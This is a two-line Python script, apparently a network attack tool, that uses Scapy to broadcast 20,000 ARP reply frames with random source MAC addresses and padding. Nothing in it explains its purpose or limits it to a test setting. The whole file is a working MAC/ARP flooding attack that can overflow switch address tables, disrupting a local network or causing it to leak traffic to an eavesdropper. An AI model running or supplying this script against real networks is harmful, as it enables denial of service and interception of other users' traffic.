from scapy.all import *

sendp(Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff")/Padding(load="X"*18), count = 20000)

